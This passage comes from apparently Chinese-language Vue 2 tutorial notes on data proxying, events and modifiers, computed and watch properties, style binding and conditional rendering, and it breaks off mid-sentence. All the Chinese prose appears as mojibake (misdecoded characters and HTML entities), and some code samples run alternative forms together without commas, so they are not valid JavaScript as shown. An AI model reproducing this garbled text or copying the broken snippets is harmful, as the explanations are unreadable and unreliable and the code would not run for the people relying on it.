ï¼šæ¨¡æ¿ä»£ç  3. VMï¼šè§†å›¾æ¨¡å‹(ViewModel)ï¼šVueå®ä¾‹ è§‚å¯Ÿå‘ç°ï¼š - dataä¸­æ‰€æœ‰çš„å±æ€§ï¼Œæœ€åéƒ½å‡ºç°åœ¨äº†vmèº«ä¸Šã€‚ - vmèº«ä¸Šæ‰€æœ‰çš„å±æ€§ åŠ VueåŸå‹ä¸Šæ‰€æœ‰å±æ€§ï¼Œåœ¨Vueæ¨¡æ¿ä¸­éƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚ &lt;div id=\"root\"&gt; &lt;h1&gt;å­¦æ ¡åç§°ï¼š{{name}}&lt;/h1&gt; &lt;h1&gt;å­¦æ ¡åœ°å€ï¼š{{address}}&lt;/h1&gt; &lt;h1&gt;æµ‹è¯•ä¸€ä¸‹1ï¼š{{1+1}}&lt;/h1&gt; &lt;h1&gt;æµ‹è¯•ä¸€ä¸‹2ï¼š{{$options}}&lt;/h1&gt; &lt;h1&gt;æµ‹è¯•ä¸€ä¸‹3ï¼š{{$emit}}&lt;/h1&gt; &lt;h1&gt;æµ‹è¯•ä¸€ä¸‹4ï¼š{{_c}}&lt;/h1&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; Vue.config.productionTip = false //é˜»æ­¢ vue åœ¨å¯åŠ¨æ—¶ç”Ÿæˆç”Ÿäº§æç¤ºã€‚ const vm = new Vue({ el:'#root', data:{ name:'Serein', address:\"Serein's blog\", } }) console.log(vm) &lt;/script&gt; æ•°æ®ä»£ç†1. å›é¡¾Object.defineProperty&lt;script type=\"text/javascript\" &gt; let number = 18 let person = { name:'å¼ ä¸‰', sex:'ç”·', } Object.defineProperty(person,'age',{ // value:18, enumerable:true, //æ§åˆ¶å±æ€§æ˜¯å¦å¯ä»¥æšä¸¾ï¼Œé»˜è®¤å€¼æ˜¯false writable:true, //æ§åˆ¶å±æ€§æ˜¯å¦å¯ä»¥è¢«ä¿®æ”¹ï¼Œé»˜è®¤å€¼æ˜¯false configurable:true //æ§åˆ¶å±æ€§æ˜¯å¦å¯ä»¥è¢«åˆ é™¤ï¼Œé»˜è®¤å€¼æ˜¯false //å½“æœ‰äººè¯»å–personçš„ageå±æ€§æ—¶ï¼Œgetå‡½æ•°(getter)å°±ä¼šè¢«è°ƒç”¨ï¼Œä¸”è¿”å›å€¼å°±æ˜¯ageçš„å€¼ get(){ console.log('æœ‰äººè¯»å–ageå±æ€§äº†') return number }, //å½“æœ‰äººä¿®æ”¹personçš„ageå±æ€§æ—¶ï¼Œsetå‡½æ•°(setter)å°±ä¼šè¢«è°ƒç”¨ï¼Œä¸”ä¼šæ”¶åˆ°ä¿®æ”¹çš„å…·ä½“å€¼ set(value){ console.log('æœ‰äººä¿®æ”¹äº†ageå±æ€§ï¼Œä¸”å€¼æ˜¯',value) number = value } }) console.log(Object.keys(person)) //æšä¸¾personå¯¹è±¡å±æ€§ console.log(person) &lt;/script&gt; 2. ä½•ä¸ºæ•°æ®ä»£ç†&lt;!-- æ•°æ®ä»£ç†ï¼šé€šè¿‡ä¸€ä¸ªå¯¹è±¡ä»£ç†å¯¹å¦ä¸€ä¸ªå¯¹è±¡ä¸­å±æ€§çš„æ“ä½œï¼ˆè¯»/å†™ï¼‰--&gt; &lt;script type=\"text/javascript\" &gt; let obj = {x:100} let obj2 = {y:200} Object.defineProperty(obj2,'x',{ get(){ return obj.x }, set(value){ obj.x = value } }) &lt;/script&gt; 3.Vueä¸­çš„æ•°æ®ä»£ç†1. Vueä¸­çš„æ•°æ®ä»£ç†ï¼šé€šè¿‡vmå¯¹è±¡æ¥ä»£ç†dataå¯¹è±¡ä¸­å±æ€§çš„æ“ä½œï¼ˆè¯»/å†™ï¼‰ 2. Vueä¸­æ•°æ®ä»£ç†çš„å¥½å¤„ï¼šæ›´åŠ æ–¹ä¾¿çš„æ“ä½œdataä¸­çš„æ•°æ® 3. åŸºæœ¬åŸç†ï¼šé€šè¿‡Object.defineProperty()æŠŠdataå¯¹è±¡ä¸­æ‰€æœ‰å±æ€§æ·»åŠ åˆ°vmä¸Šã€‚ä¸ºæ¯ä¸€ä¸ªæ·»åŠ åˆ°vmä¸Šçš„å±æ€§ï¼Œéƒ½æŒ‡å®šä¸€ä¸ªgetter/setterã€‚åœ¨getter/setterå†…éƒ¨å»æ“ä½œï¼ˆè¯»/å†™ï¼‰dataä¸­å¯¹åº”çš„å±æ€§ã€‚ &lt;div id=\"root\"&gt; &lt;h2&gt;å­¦æ ¡åç§°ï¼š{{name}}&lt;/h2&gt; &lt;h2&gt;å­¦æ ¡åœ°å€ï¼š{{address}}&lt;/h2&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const vm = new Vue({ el:'#root', data:{ name:'Serein', address:\"Serein's blog\" } }) &lt;/script&gt; äº‹ä»¶å¤„ç†1. äº‹ä»¶çš„åŸºæœ¬ä½¿ç”¨ ä½¿ç”¨v-on:xxx æˆ– @xxx ç»‘å®šäº‹ä»¶ï¼Œå…¶ä¸­xxxæ˜¯äº‹ä»¶åï¼› äº‹ä»¶çš„å›è°ƒéœ€è¦é…ç½®åœ¨methodså¯¹è±¡ä¸­ï¼Œæœ€ç»ˆä¼šåœ¨vmä¸Šï¼› methodsä¸­é…ç½®çš„å‡½æ•°ï¼Œä¸è¦ç”¨ç®­å¤´å‡½æ•°ï¼å¦åˆ™thiså°±ä¸æ˜¯vmäº†ï¼› methodsä¸­é…ç½®çš„å‡½æ•°ï¼Œéƒ½æ˜¯è¢«Vueæ‰€ç®¡ç†çš„å‡½æ•°ï¼Œthisçš„æŒ‡å‘æ˜¯vm æˆ– ç»„ä»¶å®ä¾‹å¯¹è±¡ï¼› @click=â€demoâ€ å’Œ @click=â€demo($event)â€ æ•ˆæœä¸€è‡´ï¼Œä½†åè€…å¯ä»¥ä¼ å‚ï¼› &lt;div id=\"root\"&gt; &lt;h2&gt;æ¬¢è¿æ¥åˆ°{{name}}å­¦ä¹ &lt;/h2&gt; &lt;!-- &lt;button v-on:click=\"showInfo\"&gt;ç‚¹æˆ‘æç¤ºä¿¡æ¯&lt;/button&gt; --&gt; &lt;button @click=\"showInfo1\"&gt;ç‚¹æˆ‘æç¤ºä¿¡æ¯1ï¼ˆä¸ä¼ å‚ï¼‰&lt;/button&gt; &lt;button @click=\"showInfo2($event,66)\"&gt;ç‚¹æˆ‘æç¤ºä¿¡æ¯2ï¼ˆä¼ å‚ï¼‰&lt;/button&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const vm = new Vue({ el:'#root', data:{ name:'Serein', }, methods:{ showInfo1(event){ console.log(event.target.innerText) //è·å–æŒ‰é’®çš„æ–‡å­—æ•°æ® console.log(this) //æ­¤å¤„çš„thisæ˜¯vm alert('åŒå­¦ä½ å¥½ï¼') }, showInfo2(event,number){ console.log(event,number) console.log(event.target.innerText) console.log(this) //æ­¤å¤„çš„thisæ˜¯vm alert('åŒå­¦ä½ å¥½ï¼ï¼') } } }) &lt;/script&gt; 2. äº‹ä»¶ä¿®é¥°ç¬¦ preventï¼šé˜»æ­¢é»˜è®¤äº‹ä»¶ï¼ˆå¸¸ç”¨ï¼‰ï¼› stopï¼šé˜»æ­¢äº‹ä»¶å†’æ³¡ï¼ˆå¸¸ç”¨ï¼‰ï¼› onceï¼šäº‹ä»¶åªè§¦å‘ä¸€æ¬¡ï¼ˆå¸¸ç”¨ï¼‰ï¼› captureï¼šä½¿ç”¨äº‹ä»¶çš„æ•è·æ¨¡å¼ï¼› selfï¼šåªæœ‰event.targetæ˜¯å½“å‰æ“ä½œçš„å…ƒç´ æ—¶æ‰è§¦å‘äº‹ä»¶ï¼› passiveï¼šäº‹ä»¶çš„é»˜è®¤è¡Œä¸ºç«‹å³æ‰§è¡Œï¼Œæ— éœ€ç­‰å¾…äº‹ä»¶å›è°ƒæ‰§è¡Œå®Œæ¯•ï¼›ï¼ˆä¸€èˆ¬ç§»åŠ¨ç«¯ä½¿ç”¨å®ƒï¼‰ æ³¨æ„ï¼špassiveå’Œpreventå†²çªï¼Œä¸èƒ½åŒæ—¶ç»‘å®šåœ¨ä¸€ä¸ªç›‘å¬å™¨ä¸Šã€‚ äº‹ä»¶å†’æ³¡ï¼š å³äº‹ä»¶å¼€å§‹æ—¶ç”±æœ€å…·ä½“çš„å…ƒç´ æ¥æ”¶ï¼Œç„¶åé€çº§å‘ä¸Šä¼ æ’­åˆ°è¾ƒä¸ºä¸å…·ä½“çš„èŠ‚ç‚¹ ç†è§£ï¼šæƒ³è±¡æ°”æ³¡ä»æ°´åº•å¼€å§‹å¾€ä¸Šå‡ï¼Œç”±æ·±åˆ°æµ…ï¼Œå‡åˆ°æœ€ä¸Šé¢ã€‚åœ¨ä¸Šå‡çš„è¿‡ç¨‹ä¸­ï¼Œæ°”æ³¡ä¼šç»è¿‡ä¸åŒæ·±åº¦å±‚æ¬¡çš„æ°´ã€‚ ç›¸å¯¹åº”åœ°ï¼šè¿™ä¸ªæ°”æ³¡å°±ç›¸å½“äºæˆ‘ä»¬è¿™é‡Œçš„äº‹ä»¶ï¼Œè€Œæ°´åˆ™ç›¸å½“äºæˆ‘ä»¬çš„æ•´ä¸ªdomæ ‘ï¼›äº‹ä»¶ä»dom æ ‘çš„åº•å±‚ å±‚å±‚å¾€ä¸Šä¼ é€’ï¼Œç›´è‡³ä¼ é€’åˆ°domçš„æ ¹èŠ‚ç‚¹ã€‚ äº‹ä»¶æ•è·ï¼š ä¸äº‹ä»¶å†’æ³¡å®Œå…¨ç›¸å ç½‘æ™¯å…¬å¸æå‡ºçš„äº‹ä»¶æµå«äº‹ä»¶æ•è·æµ äº‹ä»¶æ•è·æµçš„æ€æƒ³æ˜¯ä¸å¤ªå…·ä½“çš„DOMèŠ‚ç‚¹åº”è¯¥æ›´æ—©æ¥æ”¶åˆ°äº‹ä»¶ï¼Œè€Œæœ€å…·ä½“çš„èŠ‚ç‚¹åº”è¯¥æœ€åæ¥æ”¶åˆ°äº‹ä»¶ æ‡µæ‡µæ‡‚æ‡‚çš„å°ä¼™ä¼´ï¼Œè¯·çœ‹å›¾è§£: &lt;div id=\"root\"&gt; &lt;h2&gt;æ¬¢è¿æ¥åˆ°{{name}}å­¦ä¹ &lt;/h2&gt; &lt;!-- é˜»æ­¢é»˜è®¤äº‹ä»¶ï¼ˆå¸¸ç”¨ï¼‰ --&gt; &lt;a href=\"https://www.serein.icu/\" @click.prevent=\"showInfo\"&gt;ç‚¹æˆ‘æç¤ºä¿¡æ¯&lt;/a&gt; &lt;!-- é˜»æ­¢äº‹ä»¶å†’æ³¡ï¼ˆå¸¸ç”¨ï¼‰ --&gt; &lt;div class=\"demo1\" @click=\"showInfo\"&gt; &lt;button @click.stop=\"showInfo\"&gt;ç‚¹æˆ‘æç¤ºä¿¡æ¯&lt;/button&gt; &lt;!-- ä¿®é¥°ç¬¦å¯ä»¥è¿ç»­å†™ --&gt; &lt;!-- &lt;a href=\"https://www.serein.icu/\" @click.prevent.stop=\"showInfo\"&gt;ç‚¹æˆ‘æç¤ºä¿¡æ¯&lt;/a&gt; --&gt; &lt;/div&gt; &lt;!-- äº‹ä»¶åªè§¦å‘ä¸€æ¬¡ï¼ˆå¸¸ç”¨ï¼‰ --&gt; &lt;button @click.once=\"showInfo\"&gt;ç‚¹æˆ‘æç¤ºä¿¡æ¯&lt;/button&gt; &lt;!-- ä½¿ç”¨äº‹ä»¶çš„æ•è·æ¨¡å¼ --&gt; &lt;div class=\"box1\" @click.capture=\"showMsg(1)\"&gt; div1 &lt;div class=\"box2\" @click=\"showMsg(2)\"&gt; div2 &lt;/div&gt; &lt;/div&gt; &lt;!-- åªæœ‰event.targetæ˜¯å½“å‰æ“ä½œçš„å…ƒç´ æ—¶æ‰è§¦å‘äº‹ä»¶ï¼› --&gt; &lt;div class=\"demo1\" @click.self=\"showInfo\"&gt; &lt;button @click=\"showInfo\"&gt;ç‚¹æˆ‘æç¤ºä¿¡æ¯&lt;/button&gt; &lt;/div&gt; &lt;!-- äº‹ä»¶çš„é»˜è®¤è¡Œä¸ºç«‹å³æ‰§è¡Œï¼Œæ— éœ€ç­‰å¾…äº‹ä»¶å›è°ƒæ‰§è¡Œå®Œæ¯•ï¼› --&gt; //wheel(scroll) æ»šåŠ¨é¼ æ ‡æ»šè½®(æ»šåŠ¨æ¡)è§¦å‘äº‹ä»¶ &lt;ul @wheel.passive=\"demo\" class=\"list\"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ name:'Serein' }, methods:{ showInfo(e){ alert('åŒå­¦ä½ å¥½ï¼') console.log(e.target) }, showMsg(msg){ console.log(msg) }, demo(){ for (let i = 0; i &lt; 100000; i++) { console.log('#') } console.log('ç´¯åäº†') } } }) &lt;/script&gt; 3. é”®ç›˜äº‹ä»¶1. Vueä¸­å¸¸ç”¨çš„æŒ‰é”®åˆ«åï¼š å›è½¦ =&gt; enter åˆ é™¤ =&gt; delete (æ•è·â€œåˆ é™¤â€å’Œâ€œé€€æ ¼â€é”®) é€€å‡º =&gt; esc ç©ºæ ¼ =&gt; space æ¢è¡Œ =&gt; tab (ç‰¹æ®Šï¼Œå¿…é¡»é…åˆkeydownå»ä½¿ç”¨) ä¸Š =&gt; up ä¸‹ =&gt; down å·¦ =&gt; left å³ =&gt; right 2. Vueæœªæä¾›åˆ«åçš„æŒ‰é”®ï¼Œå¯ä»¥ä½¿ç”¨æŒ‰é”®åŸå§‹çš„keyå€¼å»ç»‘å®šï¼Œä½†æ³¨æ„è¦è½¬ä¸ºkebab-caseï¼ˆçŸ­æ¨ªçº¿å‘½åï¼‰ 3. ç³»ç»Ÿä¿®é¥°é”®ï¼ˆç”¨æ³•ç‰¹æ®Šï¼‰ï¼šctrlã€altã€shiftã€meta é…åˆkeyupä½¿ç”¨ï¼šæŒ‰ä¸‹ä¿®é¥°é”®çš„åŒæ—¶ï¼Œå†æŒ‰ä¸‹å…¶ä»–é”®ï¼Œéšåé‡Šæ”¾å…¶ä»–é”®ï¼Œäº‹ä»¶æ‰è¢«è§¦å‘ã€‚ é…åˆkeydownä½¿ç”¨ï¼šæ­£å¸¸è§¦å‘äº‹ä»¶ã€‚ 4. ä¹Ÿå¯ä»¥ä½¿ç”¨keyCodeå»æŒ‡å®šå…·ä½“çš„æŒ‰é”®ï¼ˆä¸æ¨èï¼ŒVue3å·²å¼ƒç”¨ï¼‰ 5. Vue.config.keyCodes.è‡ªå®šä¹‰é”®å = é”®ç ï¼Œå¯ä»¥å»å®šåˆ¶æŒ‰é”®åˆ«å(Vue3å·²å¼ƒç”¨) è®¡ç®—å±æ€§computed å®šä¹‰ï¼šè¦ç”¨çš„å±æ€§ä¸å­˜åœ¨ï¼Œè¦é€šè¿‡å·²æœ‰å±æ€§è®¡ç®—å¾—æ¥ã€‚ åŸç†ï¼šåº•å±‚å€ŸåŠ©äº†Objcet.definepropertyæ–¹æ³•æä¾›çš„getterå’Œsetterã€‚ getå‡½æ•°ä»€ä¹ˆæ—¶å€™æ‰§è¡Œï¼Ÿ åˆæ¬¡è¯»å–æ—¶ä¼šæ‰§è¡Œä¸€æ¬¡ã€‚ å½“ä¾èµ–çš„æ•°æ®å‘ç”Ÿæ”¹å˜æ—¶ä¼šè¢«å†æ¬¡è°ƒç”¨ã€‚ ä¼˜åŠ¿ï¼šä¸methodså®ç°ç›¸æ¯”ï¼Œå†…éƒ¨æœ‰ç¼“å­˜æœºåˆ¶ï¼ˆå¤ç”¨ï¼‰ï¼Œæ•ˆç‡æ›´é«˜ï¼Œè°ƒè¯•æ–¹ä¾¿ã€‚ å¤‡æ³¨ï¼š è®¡ç®—å±æ€§æœ€ç»ˆä¼šå‡ºç°åœ¨vmä¸Šï¼Œç›´æ¥è¯»å–ä½¿ç”¨å³å¯ã€‚ å¦‚æœè®¡ç®—å±æ€§è¦è¢«ä¿®æ”¹ï¼Œé‚£å¿…é¡»å†™setå‡½æ•°å»å“åº”ä¿®æ”¹ï¼Œä¸”setä¸­è¦å¼•èµ·è®¡ç®—æ—¶ä¾èµ–çš„æ•°æ®å‘ç”Ÿæ”¹å˜ã€‚ &lt;div id=\"root\"&gt; å§“ï¼š&lt;input type=\"text\" v-model=\"firstName\"&gt; &lt;br/&gt;&lt;br/&gt; åï¼š&lt;input type=\"text\" v-model=\"lastName\"&gt; &lt;br/&gt;&lt;br/&gt; å…¨åï¼š&lt;span&gt;{{fullName}}&lt;/span&gt; &lt;br/&gt;&lt;br/&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const vm = new Vue({ el:'#root', data:{ firstName:'å¼ ', lastName:'ä¸‰', }, computed:{ //å®Œæ•´å†™æ³• fullName:{ //getæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿå½“æœ‰äººè¯»å–fullNameæ—¶ï¼Œgetå°±ä¼šè¢«è°ƒç”¨ï¼Œä¸”è¿”å›å€¼å°±ä½œä¸ºfullNameçš„å€¼ //getä»€ä¹ˆæ—¶å€™è°ƒç”¨ï¼Ÿ1.åˆæ¬¡è¯»å–fullNameæ—¶ã€‚2.æ‰€ä¾èµ–çš„æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶ã€‚ get(){ console.log('getè¢«è°ƒç”¨äº†') console.log(this) //æ­¤å¤„çš„thisæ˜¯vm return this.firstName + '-' + this.lastName }, //setä»€ä¹ˆæ—¶å€™è°ƒç”¨? å½“fullNameè¢«ä¿®æ”¹æ—¶ã€‚ set(value){ console.log('set',value) const arr = value.split('-') this.firstName = arr[0] this.lastName = arr[1] } } //ç®€å†™ fullName(){ console.log('getè¢«è°ƒç”¨äº†') return this.firstName + '-' + this.lastName } } }) &lt;/script&gt; ç›‘è§†å±æ€§watch å½“è¢«ç›‘è§†çš„å±æ€§å˜åŒ–æ—¶, å›è°ƒå‡½æ•°è‡ªåŠ¨è°ƒç”¨, è¿›è¡Œç›¸å…³æ“ä½œ ç›‘è§†çš„å±æ€§å¿…é¡»å­˜åœ¨ï¼Œæ‰èƒ½è¿›è¡Œç›‘è§†ï¼ï¼ ç›‘è§†çš„ä¸¤ç§å†™æ³•ï¼š new Vueæ—¶ä¼ å…¥watché…ç½® é€šè¿‡vm.$watchç›‘è§† æ·±åº¦ç›‘è§† Vueä¸­çš„watché»˜è®¤ä¸ç›‘æµ‹å¯¹è±¡å†…éƒ¨å€¼çš„æ”¹å˜ï¼ˆä¸€å±‚ï¼‰ã€‚ é…ç½®deep:trueå¯ä»¥ç›‘æµ‹å¯¹è±¡å†…éƒ¨å€¼æ”¹å˜ï¼ˆå¤šå±‚ï¼‰ã€‚ å¤‡æ³¨ï¼š Vueè‡ªèº«å¯ä»¥ç›‘æµ‹å¯¹è±¡å†…éƒ¨å€¼çš„æ”¹å˜ï¼Œä½†Vueæä¾›çš„watché»˜è®¤ä¸å¯ä»¥ï¼ ä½¿ç”¨watchæ—¶æ ¹æ®æ•°æ®çš„å…·ä½“ç»“æ„ï¼Œå†³å®šæ˜¯å¦é‡‡ç”¨æ·±åº¦ç›‘è§†ã€‚ &lt;div id=\"root\"&gt; &lt;h2&gt;ä»Šå¤©å¤©æ°”å¾ˆ{{info}}&lt;/h2&gt; &lt;button @click=\"changeWeather\"&gt;åˆ‡æ¢å¤©æ°”&lt;/button&gt; &lt;hr/&gt; &lt;h3&gt;açš„å€¼æ˜¯:{{numbers.a}}&lt;/h3&gt; &lt;button @click=\"numbers.a++\"&gt;ç‚¹æˆ‘è®©a+1&lt;/button&gt; &lt;h3&gt;bçš„å€¼æ˜¯:{{numbers.b}}&lt;/h3&gt; &lt;button @click=\"numbers.b++\"&gt;ç‚¹æˆ‘è®©b+1&lt;/button&gt; &lt;button @click=\"numbers = {a:666,b:888}\"&gt;å½»åº•æ›¿æ¢æ‰numbers&lt;/button&gt; {{numbers.c.d.e}} &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const vm = new Vue({ el:'#root', data:{ isHot:true, numbers:{ a:1, b:1, c:{ d:{ e:100 } } } }, computed:{ info(){ return this.isHot ? 'ç‚çƒ­' : 'å‡‰çˆ½' } }, methods: { changeWeather(){ this.isHot = !this.isHot } }, watch:{ isHot:{ immediate:true, //åˆå§‹åŒ–æ—¶è®©handlerè°ƒç”¨ä¸€ä¸‹ //handlerä»€ä¹ˆæ—¶å€™è°ƒç”¨ï¼Ÿå½“isHotå‘ç”Ÿæ”¹å˜æ—¶ã€‚ handler(newValue,oldValue){ console.log('isHotè¢«ä¿®æ”¹äº†',newValue,oldValue) } }, // ç®€å†™ isHot(newValue,oldValue){ console.log('isHotè¢«ä¿®æ”¹äº†',newValue,oldValue,this) } //ç›‘è§†å¤šçº§ç»“æ„ä¸­æŸä¸ªå±æ€§çš„å˜åŒ– 'numbers.a':{ handler(){ console.log('aè¢«æ”¹å˜äº†') } } //ç›‘è§†å¤šçº§ç»“æ„ä¸­æ‰€æœ‰å±æ€§çš„å˜åŒ– numbers:{ deep:true, handler(){ console.log('numbersæ”¹å˜äº†') } } } }) vm.$watch('isHot',{ immediate:true, handler(newValue,oldValue){ console.log('isHotè¢«ä¿®æ”¹äº†',newValue,oldValue) } }) &lt;/script&gt; computedå’Œwatchä¹‹é—´çš„åŒºåˆ«ï¼š computedèƒ½å®Œæˆçš„åŠŸèƒ½ï¼Œwatchéƒ½å¯ä»¥å®Œæˆã€‚ watchèƒ½å®Œæˆçš„åŠŸèƒ½ï¼Œcomputedä¸ä¸€å®šèƒ½å®Œæˆï¼Œä¾‹å¦‚ï¼šwatchå¯ä»¥è¿›è¡Œå¼‚æ­¥æ“ä½œã€‚ ä¸¤ä¸ªé‡è¦çš„å°åŸåˆ™ï¼š æ‰€è¢«Vueç®¡ç†çš„å‡½æ•°ï¼Œæœ€å¥½å†™æˆæ™®é€šå‡½æ•°ï¼Œè¿™æ ·thisçš„æŒ‡å‘æ‰æ˜¯vm æˆ– ç»„ä»¶å®ä¾‹å¯¹è±¡ã€‚ æ‰€æœ‰ä¸è¢«Vueæ‰€ç®¡ç†çš„å‡½æ•°ï¼ˆå®šæ—¶å™¨çš„å›è°ƒå‡½æ•°ã€ajaxçš„å›è°ƒå‡½æ•°ç­‰ã€Promiseçš„å›è°ƒå‡½æ•°ï¼‰ï¼Œæœ€å¥½å†™æˆç®­å¤´å‡½æ•°ï¼Œè¿™æ ·thisçš„æŒ‡å‘æ‰æ˜¯vm æˆ– ç»„ä»¶å®ä¾‹å¯¹è±¡ã€‚ ç»‘å®šæ ·å¼ classæ ·å¼ å†™æ³•:class=â€xxxâ€ xxxå¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€å¯¹è±¡ã€æ•°ç»„ã€‚ å­—ç¬¦ä¸²å†™æ³•é€‚ç”¨äºï¼šç±»åä¸ç¡®å®šï¼Œè¦åŠ¨æ€è·å–ã€‚ æ•°ç»„å†™æ³•é€‚ç”¨äºï¼šè¦ç»‘å®šå¤šä¸ªæ ·å¼ï¼Œä¸ªæ•°ä¸ç¡®å®šï¼Œåå­—ä¹Ÿä¸ç¡®å®šã€‚ å¯¹è±¡å†™æ³•é€‚ç”¨äºï¼šè¦ç»‘å®šå¤šä¸ªæ ·å¼ï¼Œä¸ªæ•°ç¡®å®šï¼Œåå­—ä¹Ÿç¡®å®šï¼Œä½†ä¸ç¡®å®šç”¨ä¸ç”¨ã€‚ styleæ ·å¼ :style=â€{fontSize: xxx}â€å…¶ä¸­xxxæ˜¯åŠ¨æ€å€¼ã€‚ :style=â€[a,b]â€å…¶ä¸­aã€bæ˜¯æ ·å¼å¯¹è±¡ã€‚ &lt;style&gt; .basic{ width: 400px; height: 100px; border: 1px solid black; } .happy{ border: 4px solid red;; background-color: rgba(255, 255, 0, 0.644); background: linear-gradient(30deg,yellow,pink,orange,yellow); } .sad{ border: 4px dashed rgb(2, 197, 2); background-color: gray; } .normal{ background-color: skyblue; } .style1{ background-color: yellowgreen; } .style2{ font-size: 30px; text-shadow:2px 2px 10px red; } .style3{ border-radius: 20px; } &lt;/style&gt; &lt;div id=\"root\"&gt; &lt;!-- ç»‘å®šclassæ ·å¼--å­—ç¬¦ä¸²å†™æ³•ï¼Œé€‚ç”¨äºï¼šæ ·å¼çš„ç±»åä¸ç¡®å®šï¼Œéœ€è¦åŠ¨æ€æŒ‡å®š --&gt; &lt;div class=\"basic\" :class=\"mood\" @click=\"changeMood\"&gt;{{name}}&lt;/div&gt; &lt;br/&gt;&lt;br/&gt; &lt;!-- ç»‘å®šclassæ ·å¼--æ•°ç»„å†™æ³•ï¼Œé€‚ç”¨äºï¼šè¦ç»‘å®šçš„æ ·å¼ä¸ªæ•°ä¸ç¡®å®šã€åå­—ä¹Ÿä¸ç¡®å®š --&gt; &lt;div class=\"basic\" :class=\"classArr\"&gt;{{name}}&lt;/div&gt; &lt;br/&gt;&lt;br/&gt; &lt;!-- ç»‘å®šclassæ ·å¼--å¯¹è±¡å†™æ³•ï¼Œé€‚ç”¨äºï¼šè¦ç»‘å®šçš„æ ·å¼ä¸ªæ•°ç¡®å®šã€åå­—ä¹Ÿç¡®å®šï¼Œä½†è¦åŠ¨æ€å†³å®šç”¨ä¸ç”¨ --&gt; &lt;div class=\"basic\" :class=\"classObj\"&gt;{{name}}&lt;/div&gt; &lt;br/&gt;&lt;br/&gt; &lt;!-- ç»‘å®šstyleæ ·å¼--å¯¹è±¡å†™æ³• --&gt; &lt;div class=\"basic\" :style=\"styleObj\"&gt;{{name}}&lt;/div&gt; &lt;br/&gt;&lt;br/&gt; &lt;!-- ç»‘å®šstyleæ ·å¼--æ•°ç»„å†™æ³• --&gt; &lt;div class=\"basic\" :style=\"styleArr\"&gt;{{name}}&lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const vm = new Vue({ el:'#root', data:{ name:'Serein', mood:'normal', classArr:['style1','style2','style3'], classObj:{ style1:false, style2:false, }, styleObj:{ fontSize: '40px', color:'red', }, styleObj2:{ backgroundColor:'orange' }, styleArr:[ { fontSize: '40px', color:'blue', }, { backgroundColor:'gray' } ] }, methods: { changeMood(){ const arr = ['happy','sad','normal'] const index = Math.floor(Math.random()*3) this.mood = arr[index] } }, }) &lt;/script&gt; æ¡ä»¶æ¸²æŸ“ v-ifå†™æ³•ï¼š v-if=â€è¡¨è¾¾å¼â€ v-else-if=â€è¡¨è¾¾å¼â€ v-else=â€è¡¨è¾¾å¼â€ é€‚ç”¨äºï¼šåˆ‡æ¢é¢‘ç‡è¾ƒä½çš„åœºæ™¯ã€‚ç‰¹ç‚¹ï¼šä¸å±•ç¤ºçš„DOMå…ƒç´ ç›´æ¥è¢«ç§»é™¤ã€‚æ³¨æ„ï¼šv-ifå¯ä»¥å’Œ:v-else-ifã€v-elseä¸€èµ·ä½¿ç”¨ï¼Œä½†è¦æ±‚ç»“æ„ä¸èƒ½è¢«â€œæ‰“æ–­â€ã€‚ v-showå†™æ³•ï¼šv-show=â€è¡¨è¾¾å¼â€é€‚ç”¨äºï¼šåˆ‡æ¢é¢‘ç‡è¾ƒé«˜çš„åœºæ™¯ã€‚ç‰¹ç‚¹ï¼šä¸å±•ç¤ºçš„DOMå…ƒç´ æœªè¢«ç§»é™¤ï¼Œä»…ä»…æ˜¯ä½¿ç”¨æ ·å¼éšè—æ‰ å¤‡æ³¨ï¼šä½¿ç”¨v-ifçš„æ—¶ï¼Œå…ƒç´ å¯èƒ½æ— æ³•è·å–åˆ°ï¼Œè€Œä½¿ç”¨v-showä¸€å®šå¯ä»¥è·å–åˆ°ã€‚ &lt;div id=\"root\"&gt; &lt;h2&gt;å½“å‰çš„nå€¼æ˜¯:{{n}}&lt;/h2&gt; &lt;button @click=\"n++\"&gt;ç‚¹æˆ‘n+1&lt;/button&gt; &lt;!-- ä½¿ç”¨v-showåšæ¡ä»¶æ¸²æŸ“ --&gt; &lt;h2 v-show=\"false\"&gt;æ¬¢è¿æ¥åˆ°{{name}}&lt;/h2&gt; &lt;h2 v-show=\"1 === 1\"&gt;æ¬¢è¿æ¥åˆ°{{name}}&lt;/h2&gt; &lt;!-- ä½¿ç”¨v-ifåšæ¡ä»¶æ¸²æŸ“ --&gt; &lt;h2 v-if=\"false\"&gt;æ¬¢è¿æ¥åˆ°{{name}}&lt;/h2&gt; &lt;h2 v-if=\"1 === 1\"&gt;æ¬¢è¿æ¥åˆ°{{name}}&lt;/h2&gt; &lt;!-- v-elseå’Œv-else-if --&gt; &lt;div v-if=\"n === 1\"&gt;Angular&lt;/div&gt; &lt;div v-else-if=\"n === 2\"&gt;React&lt;/div&gt; &lt;div v-else-if=\"n === 3\"&gt;Vue&lt;/div&gt; &lt;div v-else&gt;å“ˆå“ˆ&lt;/div&gt; &lt;!-- v-ifä¸templateçš„é…åˆä½¿ç”¨ --&gt; &lt;template v-if=\"n === 1\"&gt; &lt;h2&gt;ä½ å¥½&lt;/h2&gt; &lt;h2&gt;Serein&lt;/h2&gt; &lt;h2&gt;Sereinblog&lt;/h2&gt; &lt;/template&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const vm = new Vue({ el:'#root', data:{ name:'Serein', n:0 } }) &lt;/script&gt; åˆ—è¡¨æ¸²æŸ“1. åŸºæœ¬åˆ—è¡¨v-foræŒ‡ä»¤: 1. ç”¨äºå±•ç¤ºåˆ—è¡¨æ•°æ® 2. è¯­æ³•ï¼šv-for=â€(item, index) in xxxâ€ :key=â€yyyâ€ 3. 